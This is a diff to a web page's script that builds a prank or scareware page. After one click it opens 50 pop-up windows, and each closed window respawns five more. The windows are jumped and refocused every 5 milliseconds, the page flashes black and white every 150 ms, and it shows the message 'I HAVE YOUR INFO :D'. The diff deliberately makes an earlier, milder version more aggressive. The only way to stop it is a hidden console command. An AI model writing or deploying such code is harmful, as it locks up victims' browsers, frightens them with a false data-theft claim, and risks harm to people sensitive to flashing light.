@@ -26,127 +26,157 @@
   <h1 id="title"></h1>
   <button id="startBtn">START</button>
 
-  <script>
-    const title = document.getElementById('title');
-    const body = document.getElementById('bodyEl');
-    const startBtn = document.getElementById('startBtn');
+<script>
+const title = document.getElementById('title');
+const body = document.getElementById('bodyEl');
+const startBtn = document.getElementById('startBtn');
 
-    const music = new Audio('music.mp3');
-    music.loop = true;
+const music = new Audio('music.mp3');
+music.loop = true;
 
-    const wordlist = ['I', 'HAVE', 'YOUR', 'INFO :D'];
-    let index = 0;
-    let nextAn = 1;
-    let popups = [];
+const wordlist = ['I', 'HAVE', 'YOUR', 'INFO :D'];
+let index = 0;
+let nextAn = 1;
+let popups = [];
 
-    function getRandomCoordinates() {
-      return [
-        Math.floor(Math.random() * (screen.width - 100)),
-        Math.floor(Math.random() * (screen.height - 100))
-      ];
-    }
+function getRandomCoordinates() {
+  return [
+    Math.floor(Math.random() * (screen.width - 100)),
+    Math.floor(Math.random() * (screen.height - 100))
+  ];
+}
 
-    function openNewWindow() {
-      const newWin = window.open(location.href + '#popup', '', 'width=350,height=200');
+function openNewWindow() {
+  const newWin = window.open(
+    location.href + '#popup',
+    '',
+    'width=350,height=200'
+  );
 
-      if (newWin) {
-        popups.push(newWin);
+  if (newWin) {
+    popups.push(newWin);
 
-        const checkClose = setInterval(() => {
-          if (newWin.closed) {
-            clearInterval(checkClose);
-            for (let i = 0; i < 2; i++) openNewWindow();
-          }
-        }, 500);
-      }
-    }
+    const checkClose = setInterval(() => {
+      if (newWin.closed) {
+        clearInterval(checkClose);
 
-    function startMadness() {
-      startBtn.style.display = 'none';
-
-      const testPop = window.open('', '', 'width=200,height=100');
-
-      if (!testPop) {
-        alert("Please enable pop-ups in your browser to continue.");
-        return;
-      } else {
-        testPop.close();
-      }
-
-      music.play();
-      popups.push(window);
-
-      setInterval(() => {
-        popups.forEach(p => {
-          try {
-            const [x, y] = getRandomCoordinates();
-            p.moveTo(x, y);
-            p.focus();
-          } catch (e) {}
-        });
-      }, 30);
-
-      setInterval(() => {
-        title.textContent = wordlist[index];
-
-        if (nextAn === 1) {
-          title.style.color = 'black';
-          body.style.backgroundColor = 'white';
-          nextAn = 2;
-        } else {
-          title.style.color = 'white';
-          body.style.backgroundColor = 'black';
-          nextAn = 1;
+        // Faster replacement spawning
+        for (let i = 0; i < 5; i++) {
+          openNewWindow();
         }
+      }
+    }, 50);
+  }
+}
 
-        index = (index + 1) % wordlist.length;
-      }, 300);
+function startMadness() {
+  startBtn.style.display = 'none';
 
-      for (let i = 0; i < 10; i++) openNewWindow();
+  const testPop = window.open('', '', 'width=200,height=100');
+
+  if (!testPop) {
+    alert("Please enable pop-ups in your browser to continue.");
+    return;
+  }
+
+  testPop.close();
+
+  music.play();
+
+  popups.push(window);
+
+  // Faster movement
+  setInterval(() => {
+    popups.forEach(p => {
+      try {
+        const [x, y] = getRandomCoordinates();
+        p.moveTo(x, y);
+        p.focus();
+      } catch (e) {}
+    });
+  }, 5);
+
+
+  // Faster title flashing
+  setInterval(() => {
+    title.textContent = wordlist[index];
+
+    if (nextAn === 1) {
+      title.style.color = 'black';
+      body.style.backgroundColor = 'white';
+      nextAn = 2;
+    } else {
+      title.style.color = 'white';
+      body.style.backgroundColor = 'black';
+      nextAn = 1;
     }
 
-    startBtn.addEventListener('click', startMadness);
+    index = (index + 1) % wordlist.length;
+  }, 150);
 
-    window.addEventListener('load', () => {
-      title.style.marginTop = (window.innerHeight / 2 - 120) + "px";
 
-      if (location.href.includes('#popup')) {
-        document.body.innerHTML = '<h1 id="title">you</h1>';
+  // Bigger initial popup burst
+  for (let i = 0; i < 50; i++) {
+    openNewWindow();
+  }
+}
 
-        const title = document.getElementById('title');
+startBtn.addEventListener('click', startMadness);
 
-        music.play();
 
-        setInterval(() => {
-          title.textContent = wordlist[index];
-          document.body.style.backgroundColor = nextAn === 1 ? 'white' : 'black';
-          title.style.color = nextAn === 1 ? 'black' : 'white';
+window.addEventListener('load', () => {
+  title.style.marginTop = (window.innerHeight / 2 - 120) + "px";
 
-          nextAn = nextAn === 1 ? 2 : 1;
-          index = (index + 1) % wordlist.length;
-        }, 300);
+  if (location.href.includes('#popup')) {
 
-      } else {
-        startBtn.style.display = 'block';
-      }
-    });
+    document.body.innerHTML = '<h1 id="title">you</h1>';
 
-    window.addEventListener('resize', () => {
-      title.style.marginTop = (window.innerHeight / 2 - 120) + "px";
-    });
+    const title = document.getElementById('title');
 
-    // Hidden console command to close everything
-    window.closeAll = () => {
-      popups.forEach(p => {
-        try { p.close(); } catch (e) {}
-      });
+    music.play();
 
-      music.pause();
-      music.currentTime = 0;
-      popups = [];
+    setInterval(() => {
+      title.textContent = wordlist[index];
 
-      console.log("Closed all popups and stopped music.");
-    };
-  </script>
+      document.body.style.backgroundColor =
+        nextAn === 1 ? 'white' : 'black';
+
+      title.style.color =
+        nextAn === 1 ? 'black' : 'white';
+
+      nextAn = nextAn === 1 ? 2 : 1;
+      index = (index + 1) % wordlist.length;
+
+    }, 150);
+
+  } else {
+    startBtn.style.display = 'block';
+  }
+});
+
+
+window.addEventListener('resize', () => {
+  title.style.marginTop =
+    (window.innerHeight / 2 - 120) + "px";
+});
+
+
+// Close everything command
+window.closeAll = () => {
+  popups.forEach(p => {
+    try {
+      p.close();
+    } catch (e) {}
+  });
+
+  music.pause();
+  music.currentTime = 0;
+  popups = [];
+
+  console.log("Closed all popups and stopped music.");
+};
+
+</script>
+
 </body>
 </html>
